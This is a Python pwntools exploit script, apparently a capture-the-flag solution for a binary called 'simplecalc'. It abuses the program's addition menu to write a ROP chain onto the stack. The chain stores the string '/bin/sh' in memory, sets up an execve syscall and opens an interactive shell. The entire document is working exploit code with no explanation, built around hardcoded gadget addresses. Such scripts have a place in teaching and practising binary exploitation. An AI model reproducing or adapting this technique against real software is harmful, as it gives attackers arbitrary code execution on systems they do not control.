from pwn import *

target = process('./simplecalc')
gdb.attach(target, gdbscript='b *0x40154a')

target.recvuntil('calculations')
target.sendline('100')

popRax = 0x44db34
popRdi = 0x401b73
popRsi = 0x401c87
popRdx = 0x437a85

# 0x000000000044526e : mov qword ptr [rax], rdx ; ret
movGadget = 0x44526e

syscall = 0x400488

def addSingle(x):
	target.recvuntil("=> ")
	target.sendline("1")
	target.recvuntil("Integer x: ")
	target.sendline("100")
	target.recvuntil("Integer y: ")
	target.sendline(str(x-100))

def add(z):
	x = z & 0x00000000ffffffff # lower 32 bits
	y = ((z & 0xffffffff00000000) >> 32) # upper 32 bits
	addSingle(x)
	addSingle(y)

for i in range(9):
	add(0x0)

add(popRax)
add(0x6c1000)
add(popRdx)
add(0x0068732f6e69622f)
add(movGadget)

add(popRax)
add(0x3b)

add(popRdi)
add(0x6c1000)

add(popRsi)
add(0x0)

add(popRdx)
add(0x0)

add(syscall)

target.sendline('5')
target.interactive()
